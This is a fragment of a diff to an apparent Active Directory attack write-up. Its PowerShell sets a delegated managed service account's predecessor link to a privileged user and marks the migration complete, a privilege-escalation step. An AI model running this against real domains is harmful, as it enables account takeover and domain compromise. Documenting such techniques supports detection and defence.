@@ -55,7 +55,7 @@ Set-Acl -Path "AD:\CN=BadDMSA1234,OU=SomeOU,DC=example,DC=com" -AclObject $acl
 
 ```powershell
 Set-ADServiceAccount -Identity BadDMSA1234 -Replace @{
-    'msDS-ManagedAccountPrecededByLink' = 'CN=TargetComputer,OU=Computers,DC=example,DC=com'
+    'msDS-ManagedAccountPrecededByLink' = 'CN=Privilegeduser,DC=example,DC=com'
     'msDS-DelegatedMSAState' = 2
 }
 ```
